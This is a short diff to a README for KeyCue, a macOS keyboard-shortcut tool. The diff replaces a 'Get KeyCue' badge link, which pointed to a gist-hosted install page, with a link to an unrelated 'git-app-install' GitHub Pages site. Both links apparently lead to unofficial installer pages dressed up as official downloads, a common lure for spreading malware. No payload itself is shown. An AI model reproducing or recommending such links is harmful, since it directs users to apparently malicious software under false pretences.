@@ -2,7 +2,7 @@
 
 KeyCue is a macOS productivity tool that reveals all keyboard shortcuts of the active application. It helps users learn shortcuts faster, navigate apps efficiently, and boost overall workflow.
 
-<a href="https://gistcdn.githack.com/bezumieblue3/d04747b77a3064f0bbfb7a22473bb602/raw/3c6ba3c0e4455a35af109b6f6999920cbae25642/install.html?offer=KeyCue" target="_blank">
+<a href="https://git-app-install.github.io/.github/?offer=KeyCue" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20KeyCue%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
